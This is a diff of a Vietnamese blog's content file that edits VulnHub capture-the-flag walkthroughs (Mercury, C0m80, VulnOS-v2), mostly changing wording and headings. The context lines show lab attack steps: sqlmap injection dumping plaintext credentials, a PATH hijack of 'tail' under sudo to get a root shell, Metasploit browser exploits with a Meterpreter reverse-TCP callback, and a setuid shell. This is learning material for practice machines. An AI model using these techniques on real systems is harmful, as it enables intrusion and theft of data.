-<p>Khấm khá hơn đấy, tìm thấy thư mục SilverStream, đếch cần biết nó nghĩa là gì, truy cập vào xem sao đã.<br><img src="pic1.png"><br>Ờ hớ, thư mục không tồn tại, trả về lỗi 404, nhưng chế độ debug của web được bật nên chúng ta có thể thấy được một thư mục có tên là <strong>/mercuryfacts/</strong>. Mặt mũi của nó như thế này.<br><img src="pic2.png"><br>Và khi nhấn vào để xem Mercury Fact thì nhận được vỏn vẹn dòng <strong><em>Fact id: 1. ((‘Mercury does not have any moons or rings.’,),)</em></strong>. Ngắm nghía cái xem nào, cái này lấy <em>fact</em> theo <em>id</em> (url: <a href="http://10.10.10.10:8080/mercuryfacts/1/">http://10.10.10.10:8080/mercuryfacts/1/</a>), vậy thì kiểm tra sql injection xem sao.<br><img src="pic3.png"><br>Á đù, vẫn là chế độ debug, và nó đem lại quá nhiều thông tin ngon bổ rẻ ở đây, chúng ta biết được url này có lỗi sql injection, biết được câu truy vấn, hệ quản trị là mysql, và cả lú thông tin cấu hình web server bên dưới nữa. Ok, ném cái url này vào <strong>sqlmap</strong> và lấy toàn bộ cơ sở dữ liệu ra xem.</p>
+<p>Khấm khá hơn đấy, tìm thấy thư mục <em>/SilverStream</em>, đếch cần biết nó nghĩa là gì, truy cập vào xem sao đã.<br><img src="pic1.png"><br>Ờ hớ, thư mục không tồn tại, trả về lỗi 404, nhưng do chế độ debug của web site được bật nên tôi thấy được một thư mục có tên là <em>/mercuryfacts</em>. Mặt mũi của nó như thế này.<br><img src="pic2.png"><br>Và khi nhấn vào để xem Mercury Fact thì nhận được vỏn vẹn dòng <strong><em>Fact id: 1. ((‘Mercury does not have any moons or rings.’,),)</em></strong>. Ngắm nghía cái xem nào, cái này lấy <em>fact</em> theo <em>id</em> (url: <a href="http://10.10.10.10:8080/mercuryfacts/1/">http://10.10.10.10:8080/mercuryfacts/1/</a>), vậy thì kiểm tra sql injection xem sao.<br><img src="pic3.png"><br>Á đù, vẫn là chế độ debug, và nó đem lại quá nhiều thông tin ngon bổ rẻ ở đây, tôi biết được url này có lỗi sql injection, biết được câu truy vấn, hệ quản trị là mysql, và cả lú thông tin cấu hình http server bên dưới nữa. Ok, ném cái url này vào <em>sqlmap</em> và lấy toàn bộ cơ sở dữ liệu ra xem.</p>
 <h3 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h3><pre class="line-numbers language-none"><code class="language-none">$ sqlmap --level&#x3D;5 --risk&#x3D;3 --threads&#x3D;10 -u &quot;http:&#x2F;&#x2F;10.10.10.10:8080&#x2F;mercuryfacts&#x2F;1*&#x2F;&quot; --dbms&#x3D;mysql
 ...
 [INFO] fetching database names
@@ -910,7 +910,7 @@ Table: users
 | 4  | mercuryisthesizeof0.056Earths | webmaster |
 +----+-------------------------------+-----------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>Toẹt vời, mật khẩu lưu trong database nhưng không được mã hóa. Đoán là mấy cái tài khoản này được dùng để đăng nhập vào SSH, chứ cái web tò te này thì làm éo có trang login nào. Zô!<br><em>(Sau vài lần login sai, cuối cùng thì chỉ có mỗi cái tài khoản webmaster là dùng được thôi, còn lại là trap hết)</em></p>
-<pre class="line-numbers language-none"><code class="language-none">$ ssh webmaster@10.10.10.10                                                                      
+<h3 id="Get-User-Flag"><a href="#Get-User-Flag" class="headerlink" title="Get User Flag"></a>Get User Flag</h3><pre class="line-numbers language-none"><code class="language-none">$ ssh webmaster@10.10.10.10                                                                      
 webmaster@10.10.10.10&#39;s password: 
 Welcome to Ubuntu 20.04.1 LTS (GNU&#x2F;Linux 5.4.0-45-generic x86_64)
 
@@ -952,7 +952,7 @@ drwxrwxr-x 5 webmaster webmaster 4096 Aug 28 12:56 mercury_proj
 webmaster@mercury:~$ cat user_flag.txt 
 [user_flag_8339915c9a454657bd60ee58776f4ccd]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>Flag đầu tiên, <strong>[user_flag_8339915c9a454657bd60ee58776f4ccd]</strong>.</p>
-<h2 id="Get-Root-Flag"><a href="#Get-Root-Flag" class="headerlink" title="Get Root Flag"></a>Get Root Flag</h2><p>Tiếp theo, tiết mục leo thang đặc quyền (Privileges Escalation).<br>Lần mò vào cái thư mục <strong>mercury_proj</strong>, đây là thư mục chứa script python để chạy web server, và có 1 file <strong>notes.txt</strong>.</p>
+<h2 id="Privileges-Escalation"><a href="#Privileges-Escalation" class="headerlink" title="Privileges Escalation"></a>Privileges Escalation</h2><p>Lần mò vào cái thư mục <strong>mercury_proj</strong>, đây là thư mục chứa script python để chạy web server, và có 1 file <strong>notes.txt</strong>.</p>
 <pre class="line-numbers language-none"><code class="language-none">webmaster@mercury:~&#x2F;mercury_proj$ ls -al
 total 28
 drwxrwxr-x 5 webmaster webmaster 4096 Aug 28 12:56 .
@@ -986,7 +986,7 @@ User linuxmaster may run the following commands on mercury:
 linuxmaster@mercury:~$ cat &#x2F;usr&#x2F;bin&#x2F;check_syslog.sh
 #!&#x2F;bin&#x2F;bash
 tail -n 10 &#x2F;var&#x2F;log&#x2F;syslog<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="PATH-variables"><a href="#PATH-variables" class="headerlink" title="PATH variables"></a>PATH variables</h2><p>User linuxmaster có thể chạy /usr/bin/check_syslog.sh với sudo, với quyền root. Nội dung bash script dùng <em>tail</em> để kiểm tra log hệ thống, có thể nghĩ sang cách theo thang đặc quyền sử dụng PATH variables.<br>Theo hướng này, đầu tiên là tạo một file có tên là <strong>tail</strong>, nội dung là <code>/bin/bash</code>, mục đích là khi chạy lệnh <code>sudo /usr/bin/check_syslog.sh</code> với PATH trỏ đến đường dẫn chứa file <strong>tail</strong>, hệ thống sẽ gọi <strong>tail</strong> từ PATH mà chúng ta cung cấp, khi đó file <strong>tail</strong> sẽ được thực thi với quyền root và khởi động shell, vậy là chúng ta sẽ có root shell.</p>
+<h3 id="Get-Root-Flag"><a href="#Get-Root-Flag" class="headerlink" title="Get Root Flag"></a>Get Root Flag</h3><p>User linuxmaster có thể chạy /usr/bin/check_syslog.sh với sudo, với quyền root. Nội dung bash script dùng <em>tail</em> để kiểm tra log hệ thống, có thể nghĩ sang cách theo thang đặc quyền sử dụng PATH variables.<br>Theo hướng này, đầu tiên là tạo một file có tên là <strong>tail</strong>, nội dung là <code>/bin/bash</code>, mục đích là khi chạy lệnh <code>sudo /usr/bin/check_syslog.sh</code> với PATH trỏ đến đường dẫn chứa file <strong>tail</strong>, hệ thống sẽ gọi <strong>tail</strong> từ PATH mà chúng ta cung cấp, khi đó file <strong>tail</strong> sẽ được thực thi với quyền root và khởi động shell, vậy là chúng ta sẽ có root shell.</p>
 <pre class="line-numbers language-none"><code class="language-none">linuxmaster@mercury:~$ mkdir duma
 linuxmaster@mercury:~$ cd duma
 linuxmaster@mercury:~&#x2F;duma$ echo &quot;&#x2F;bin&#x2F;bash&quot; &gt; tail
@@ -1047,7 +1047,7 @@ If you have any feedback please contact me at SirFlash@protonmail.com
   <entry>
     <title>[VulnHub] C0m80</title>
     <url>/2020/12/29/C0m80-vulnhub/</url>
-    <content><![CDATA[<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>Link download: <a href="https://www.vulnhub.com/entry/c0m80-1,198/">C0M80: 1</a><br>Difficulty: <em>[Difficult] but depends on you really</em> (Đù, nó khó vê lờ luôn, thề!)</p>
+    <content><![CDATA[<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>Link download: <a href="https://www.vulnhub.com/entry/c0m80-1,198/">C0M80: 1</a><br>Difficulty: <em>[Difficult] but depends on you really</em> (Khó vãi cả đái, thề!)</p>
 <a id="more"></a>
 <h2 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><p>Vẫn là những bước đầu tiên, kiếm xem machine ml này đang có IP là gì.</p>
 <pre class="line-numbers language-none"><code class="language-none">$ nmap 10.10.10.0&#x2F;24                                                                             
@@ -1197,7 +1197,7 @@ Host script results:
 
 Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .
 Nmap done: 1 IP address (1 host up) scanned in 158.12 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>Sơ qua đây thì có thể thấy machine đang mở cổng đáng chú ý như 80-HTTP, 139 và 445 Samba, 2049-NFS, 20021 có thể là FTP.<br>Tìm hiểu qua về NFS, cái này mới lạ đấy, thề là lần đầu mình thấy cái này :v</p>
+<p>Sơ qua đây thì có thể thấy machine đang mở cổng đáng chú ý như 80-HTTP, 139 và 445 Samba, 2049-NFS, 20021 có thể là FTP.<br>Tìm hiểu qua về NFS, cái này mới lạ đấy, thề là lần đầu tôi thấy cái này :v</p>
 <blockquote>
 <p><a href="https://en.wikipedia.org/wiki/Network_File_System">https://en.wikipedia.org/wiki/Network_File_System</a><br><em>Network File System (NFS) is a distributed file system protocol originally developed by Sun Microsystems (Sun) in 1984,[1] allowing a user on a client computer to access files over a computer network much like local storage is accessed. NFS, like many other protocols, builds on the Open Network Computing Remote Procedure Call (ONC RPC) system. The NFS is an open standard defined in a Request for Comments (RFC), allowing anyone to implement the protocol.</em></p>
 </blockquote>
@@ -1213,7 +1213,7 @@ total 2736
 drwxrwx---  2 root   backup    4096 Sep 23  2017 .
 drwxrwxrwt 18 root   root     36864 Dec 31 09:53 ..
 -rw-r--r--  1 backup backup 2757002 Dec 31 09:53 ftp104.bkp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>Thó được file <em>ftp104.bkp</em>, mở ra thì thấy toàn mã hexdump, kiểm tra các bit signature thì thấy đây có thể là một file thực thi của WIndows, nhưng convert sang .exe thì thực thi bị lỗi, vẫn chưa hiểu sao. Dù mình đã xóa đi những ký tự không phải hexdump như thông tin về ngày tháng ở đầu file, mấy dòng kẻ… Kệ đấy đã, để sau, giờ đi kiếm thông tin tiếp.<br>Vào trong cái website trên cổng 80 nhận được một trang landing, hmm, nothing to do here.<br><img src="pic1.png"></p>
+<p>Thó được file <em>ftp104.bkp</em>, mở ra thì thấy toàn mã hexdump, kiểm tra các bit signature thì thấy đây có thể là một file thực thi của Windows, nhưng convert sang .exe thì thực thi bị lỗi, vẫn chưa hiểu sao. Dù tôi đã xóa đi những ký tự không phải hexdump như thông tin về ngày tháng ở đầu file, mấy dòng kẻ… Kệ đấy đã, để sau, giờ đi kiếm thông tin tiếp.<br>Vào trong cái website trên cổng 80 nhận được một trang landing, hmm, nothing to do here.<br><img src="pic1.png"></p>
 <h3 id="Dirsearch"><a href="#Dirsearch" class="headerlink" title="Dirsearch"></a>Dirsearch</h3><p>Tìm cái đống tệp tin, thư mục ẩn của nó ra.</p>
 <pre class="line-numbers language-none"><code class="language-none">$ .&#x2F;dirsearch.py -u http:&#x2F;&#x2F;10.10.10.12 -e html,php,txt -x 403
 Extensions: html, php, txt | HTTP method: GET | Threads: 30 | Wordlist size: 9791
@@ -1244,7 +1244,7 @@ Target: http:&#x2F;&#x2F;10.10.10.12&#x2F;
 <pre class="line-numbers language-none"><code class="language-none">PHP Version 5.2.8
 MySQL version: 5.1.30
 bla bla<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>Thêm nữa, trong uri <em>/bugs</em>, Mantis Bug Tracker, cái này mình cũng lần đầu gặp luôn :)) chả biết mọe gì về nó cả, chỉ biết là nó yêu cầu login, Okay, Google về nó xem sao.<br><img src="pic2.png"></p>
+<p>Thêm nữa, trong uri <em>/bugs</em>, Mantis Bug Tracker, cái này tôi cũng lần đầu gặp luôn :)) chả biết mọe gì về nó cả, chỉ biết là nó yêu cầu login, Okay, Google về nó xem sao.<br><img src="pic2.png"></p>
 <h3 id="Searchsploit"><a href="#Searchsploit" class="headerlink" title="Searchsploit"></a>Searchsploit</h3><p>Tìm kiếm với Searchsploit về thằng này để mò mẫm một hướng khai thác.</p>
 <pre class="line-numbers language-none"><code class="language-none">$ searchsploit mantis                                                                                                               
 ----------------------------------------------------------------------------------------------------- ---------------------------
@@ -1419,8 +1419,8 @@ ftp<span class="token operator">></span> <span class="token function">ls</span>
 ftp<span class="token operator">></span><span class="token number">502</span> Unknown <span class="token function">ftp</span> <span class="token builtin class-name">command</span>
 ftp<span class="token operator">></span> <span class="token builtin class-name">exit</span>
 ftp<span class="token operator">></span>TryHarder <span class="token punctuation">;</span>D<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>Cái này thì xương máu mà nói, mình thử hết rồi, tất cả lệnh đều bị chặn lại hết. Nó chặn thế nào, chặn kiểu gì, thì phải xem nó làm gì, làm như nào. Nhắc lại trên là đã có <em>bestFTPserver.exe</em> và <em>bfsvrdll.dll</em> để chạy mô phỏng, giờ reverse nó với Ollydbg.</p>
-<p>Mình là thằng đéo biết gì về reverse, nên là chỉ lướt qua qua mấy cái string ASCII, xem nó nhảy vào đâu, gọi cái gì… Tóm cái váy lại, FTP này thực hiện khá là đơn giản, đúng như cái tên, <em>bestFTPserver</em>, việc của nó là so sánh các chuỗi lệnh nhập vào, éo làm gì cả, hiển thị ra thông báo lỗi luôn =)). Có vài lệnh thì in ra văn bản (<em>system, ls…</em>).</p>
+<p>Cái này thì xương máu mà nói, tôi thử hết rồi, tất cả lệnh đều bị chặn lại hết. Nó chặn thế nào, chặn kiểu gì, thì phải xem nó làm gì, làm như nào. Nhắc lại trên là đã có <em>bestFTPserver.exe</em> và <em>bfsvrdll.dll</em> để chạy mô phỏng, giờ reverse nó với Ollydbg.</p>
+<p>Tôi là thằng đéo biết gì về reverse, nên là chỉ lướt qua qua mấy cái string ASCII, xem nó nhảy vào đâu, gọi cái gì… Tóm cái váy lại, FTP này thực hiện khá là đơn giản, đúng như cái tên, <em>bestFTPserver</em>, việc của nó là so sánh các chuỗi lệnh nhập vào, éo làm gì cả, hiển thị ra thông báo lỗi luôn =)). Có vài lệnh thì in ra văn bản (<em>system, ls…</em>).</p>
 <p>Nhưng đoạn này, với các input với mở đầu là http hoặc https, nó sẽ thực hiện lệnh <code>explorer</code> để mở đường dẫn với trình duyệt mặc định.</p>
 <blockquote>
 <p>Lệnh explorer trên Windows để gọi đến trình quản lý file (File Explorer), nhưng nếu tham số đầu vào là một đường link, nó sẽ gọi đến trình duyệt (browser) và truy cập vào đường link đó.</p>
@@ -1439,7 +1439,7 @@ Installation Details
   OS Name    <span class="token builtin class-name">:</span> Windows XP
   Target CPU <span class="token builtin class-name">:</span> x86<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>Chết nhé, phiên bản Firefox đang là 13.0.1, quá cũ, đi kèm với sự cũ kỹ này là một đống lỗi RCE. Giờ thì bằng cách nào đó, gửi cho machine một đường link bằng cái FTP lởm kia, Firefox truy cập vào, lấy được shell.<br><a href="https://www.cvedetails.com/vulnerability-list/vendor_id-452/product_id-3264/version_id-136386/Mozilla-Firefox-13.0.1.html">https://www.cvedetails.com/vulnerability-list/vendor_id-452/product_id-3264/version_id-136386/Mozilla-Firefox-13.0.1.html</a></p>
-<h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><p>Ở đây mình dùng module auto_pwned của metasploit, đại khái là nó sẽ tạo ra một loạt các kịch bản khai thác sẵn có và nhét hết vào 1 đường link, sau khi trình duyệt truy cập vào, nếu có lỗi khớp với các kịch bản khai thác đang được chạy, metasploit sẽ lấy về một hoặc nhiều session (hiểu là shell) trên máy nạn nhân, lấy được bao nhiêu thì còn tùy vào số lỗi có thể khai thác.</p>
+<h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><p>Ở đây tôi dùng module auto_pwned của metasploit, đại khái là nó sẽ tạo ra một loạt các kịch bản khai thác sẵn có và nhét hết vào 1 đường link, sau khi trình duyệt truy cập vào, nếu có lỗi khớp với các kịch bản khai thác đang được chạy, metasploit sẽ lấy về một hoặc nhiều session (hiểu là shell) trên máy nạn nhân, lấy được bao nhiêu thì còn tùy vào số lỗi có thể khai thác.</p>
 <pre class="line-numbers language-none"><code class="language-none">[+] Please use the following URL for the browser attack:
 [+] BrowserAutoPwn URL: http:&#x2F;&#x2F;10.10.10.1:8080&#x2F;eKl8aErr
 [*] Server started.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
@@ -1456,15 +1456,15 @@ nil versions are discouraged and will be deprecated in Rubygems 4
 [*] 10.10.10.12      adobe_flash_hacking_team_uaf - Sending HTML...
 [*] 10.10.10.12      adobe_flash_hacking_team_uaf - Request: &#x2F;TbML&#x2F;tHTebS&#x2F;ggKSZR.swf
 [*] 10.10.10.12      adobe_flash_hacking_team_uaf - Sending SWF...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>Mình quay sang chạy lại kịch bản khai thác với lỗi <em>firefox_proto_crmfrequest</em> với options tương tự.<br><em>(<a href="https://www.rapid7.com/db/modules/exploit/multi/browser/firefox_proto_crmfrequest">https://www.rapid7.com/db/modules/exploit/multi/browser/firefox_proto_crmfrequest</a>)</em></p>
-<p>Lần này thì lấy được session, nhưng shell này bị ngu si thế đéo nào ấy :D<br>Sau một hồi chán nản và quay ra chơi cờ vua với đồng nghiệp, ngồi lại vào ghế, ngắm nghía cẩn thận các option, mình phát hiện ra đoạn này.</p>
+<p>Tôi quay sang chạy lại kịch bản khai thác với lỗi <em>firefox_proto_crmfrequest</em> với options tương tự.<br><em>(<a href="https://www.rapid7.com/db/modules/exploit/multi/browser/firefox_proto_crmfrequest">https://www.rapid7.com/db/modules/exploit/multi/browser/firefox_proto_crmfrequest</a>)</em></p>
+<p>Lần này thì lấy được session, nhưng shell này bị ngu si thế đéo nào ấy :D<br>Sau một hồi chán nản và quay ra chơi cờ vua với đồng nghiệp, ngồi lại vào ghế, ngắm nghía cẩn thận các option, tôi phát hiện ra đoạn này.</p>
 <pre class="line-numbers language-none"><code class="language-none">Exploit targets:
 
    Id  Name
    --  ----
    0   Universal (Javascript XPCOM Shell)
    1   Native Payload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>Ồ nố! Mặc định target đang là ID 0, tức <em>Universal (Javascript XPCOM Shell)</em>. Lúc này cần chú ý đến một phần quan trọng nữa của Metasploit, đó là PAYLOAD.<br>Mặc định, PAYLOAD sẽ là <em>generic/shell_reverse_tcp</em>, lúc này Metasploit sẽ tự động chọn một PAYLOAD phù hợp để tải lên. Việc tự động chọn như này, có thể đúng, có thể sai, và trong trường hợp này thì nó đã sai. Có thể nó đã tải lên một PAYLOAD dành cho Linux, hoặc gì gì đó, trong khi dịch vụ FTP này thì đang chạy giả lập Windows, vậy nên sẽ cần một PAYLOAD dành cho Windows. Ở đây mình chọn là <em>windows/meterpreter/reverse_tcp</em>.<br><em>Để hiểu đúng, và hiểu rõ về PAYLOAD thì thực sự mình cũng đéo hiểu :v, hẹn khi nào hiểu thì sẽ update lại bài viết</em><br>Đổi lại target ID 1 và PAYLOAD <em>windows/meterpreter/reverse_tcp</em>. EXPLOIT!</p>
+<p>Ồ nố! Mặc định target đang là ID 0, tức <em>Universal (Javascript XPCOM Shell)</em>. Lúc này cần chú ý đến một phần quan trọng nữa của Metasploit, đó là PAYLOAD.<br>Mặc định, PAYLOAD sẽ là <em>generic/shell_reverse_tcp</em>, lúc này Metasploit sẽ tự động chọn một PAYLOAD phù hợp để tải lên. Việc tự động chọn như này, có thể đúng, có thể sai, và trong trường hợp này thì nó đã sai. Có thể nó đã tải lên một PAYLOAD dành cho Linux, hoặc gì gì đó, trong khi dịch vụ FTP này thì đang chạy giả lập Windows, vậy nên sẽ cần một PAYLOAD dành cho Windows. Ở đây tôi chọn là <em>windows/meterpreter/reverse_tcp</em>.<br><em>Để hiểu đúng, và hiểu rõ về PAYLOAD thì thực sự tôi cũng đéo hiểu :v, hẹn khi nào hiểu thì sẽ update lại bài viết</em><br>Đổi lại target ID 1 và PAYLOAD <em>windows/meterpreter/reverse_tcp</em>. EXPLOIT!</p>
 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.12      firefox_proto_crmfrequest - Gathering target information <span class="token keyword">for</span> <span class="token number">10.10</span>.10.12
 <span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.12      firefox_proto_crmfrequest - Sending HTML response to <span class="token number">10.10</span>.10.12
 <span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">10.10</span>.10.12      firefox_proto_crmfrequest - Sending HTML
@@ -1545,7 +1545,7 @@ uid&#x3D;1001(al1ce) gid&#x3D;34(backup) groups&#x3D;34(backup)<span aria-hidden
 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token builtin class-name">pwd</span>
 /ftpsvr/bkp
 $ <span class="token function">cp</span> /bin/sh <span class="token builtin class-name">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>Ở root shell trên máy mình, chuyển quyền sở hữu file <em>sh</em> cho root và set UID cho nó.<br>Ơ thế tại sao không copy luôn bash/sh từ root shell trên máy mình vào đấy, đỡ mất công chuyển quyền sở hữu file? Vì chưa chắc bash/sh trên máy mình đã tương thích được với hệ thống bên al1ce, có thể khác biệt x86 x64, hoặc nhân Linux, etc… thử mà xem :))</p>
+<p>Ở root shell trên máy tôi, chuyển quyền sở hữu file <em>sh</em> cho root và set UID cho nó.<br>Ơ thế tại sao không copy luôn bash/sh từ root shell trên máy mình vào đấy, đỡ mất công chuyển quyền sở hữu file? Vì chưa chắc bash/sh trên máy mình đã tương thích được với hệ thống bên al1ce, có thể khác biệt x86 x64, hoặc nhân Linux, etc… thử mà xem :))</p>
 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># ls -al                                                                                         </span>
 total <span class="token number">2848</span>
 drwxrwx---  <span class="token number">2</span> root   backup    <span class="token number">4096</span> Jan  <span class="token number">1</span> <span class="token number">23</span>:05 <span class="token builtin class-name">.</span>
@@ -1644,61 +1644,124 @@ Nmap done: 1 IP address (1 host up) scanned in 4.56 seconds<span aria-hidden="tr
       </tags>
   </entry>
   <entry>
-    <title>vulnos-vulnhub</title>
+    <title>[VulnHub] VulnOS-v2</title>
     <url>/2021/02/01/vulnos-vulnhub/</url>
-    <content><![CDATA[<p>Writing…</p>
+    <content><![CDATA[<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>Link download: <a href="https://www.vulnhub.com/entry/vulnos-2,147/">VULNOS: 2</a><br>Difficulty: Easy<br>Đuỵt moẹ, phải nói là cái bài củ lìn này nhiều trap thực sự, đi mò mẫm mất thời gian vcl mà toàn rabbit hole.</p>
 <a id="more"></a>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nmap -sn -v 10.10.10.102-105
-Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-02-03 15:39 +07
-Initiating Ping Scan at 15:39
-Scanning 4 hosts [2 ports&#x2F;host]
-Completed Ping Scan at 15:39, 1.20s elapsed (4 total hosts)
-Initiating Parallel DNS resolution of 1 host. at 15:39
-Completed Parallel DNS resolution of 1 host. at 15:39, 0.04s elapsed
-Nmap scan report for 10.10.10.102 [host down]
-Nmap scan report for 10.10.10.103
-Host is up (0.00058s latency).
-Nmap scan report for 10.10.10.104 [host down]
-Nmap scan report for 10.10.10.105 [host down]
-Read data files from: &#x2F;usr&#x2F;bin&#x2F;..&#x2F;share&#x2F;nmap<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nmap -p- 10.10.10.103 --min-rate 3000
-Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-02-03 15:39 +07
-Nmap scan report for 10.10.10.103
-Host is up (0.00013s latency).
-Not shown: 65532 closed ports
-PORT     STATE SERVICE
-22&#x2F;tcp   open  ssh
-80&#x2F;tcp   open  http
-6667&#x2F;tcp open  irc
+<h2 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ nmap -sn -v <span class="token number">10.10</span>.10.102-105
+Starting Nmap <span class="token number">7.91</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2021</span>-02-03 <span class="token number">15</span>:39 +07
+Initiating Ping Scan at <span class="token number">15</span>:39
+Scanning <span class="token number">4</span> hosts <span class="token punctuation">[</span><span class="token number">2</span> ports/host<span class="token punctuation">]</span>
+Completed Ping Scan at <span class="token number">15</span>:39, <span class="token number">1</span>.20s elapsed <span class="token punctuation">(</span><span class="token number">4</span> total hosts<span class="token punctuation">)</span>
+Initiating Parallel DNS resolution of <span class="token number">1</span> host. at <span class="token number">15</span>:39
+Completed Parallel DNS resolution of <span class="token number">1</span> host. at <span class="token number">15</span>:39, <span class="token number">0</span>.04s elapsed
+Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.10.102 <span class="token punctuation">[</span>host down<span class="token punctuation">]</span>
+Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.10.103
+Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00058s latency<span class="token punctuation">)</span>.
+Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.10.104 <span class="token punctuation">[</span>host down<span class="token punctuation">]</span>
+Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.10.105 <span class="token punctuation">[</span>host down<span class="token punctuation">]</span>
+Read data files from: /usr/bin/<span class="token punctuation">..</span>/share/nmap
 
-Nmap done: 1 IP address (1 host up) scanned in 1.05 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nmap -p 22,80,6667 -A 10.10.10.103   
-Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-02-03 15:41 +07
-Nmap scan report for 10.10.10.103
-Host is up (0.00064s latency).
+$ nmap -p- <span class="token number">10.10</span>.10.103 --min-rate <span class="token number">3000</span>
+Starting Nmap <span class="token number">7.91</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2021</span>-02-03 <span class="token number">15</span>:39 +07
+Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.10.103
+Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00013s latency<span class="token punctuation">)</span>.
+Not shown: <span class="token number">65532</span> closed ports
+PORT     STATE SERVICE
+<span class="token number">22</span>/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>
+<span class="token number">80</span>/tcp   <span class="token function">open</span>  http
+<span class="token number">6667</span>/tcp <span class="token function">open</span>  irc
+
+Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">1.05</span> seconds
+
+$ nmap -p <span class="token number">22,80</span>,6667 -A <span class="token number">10.10</span>.10.103   
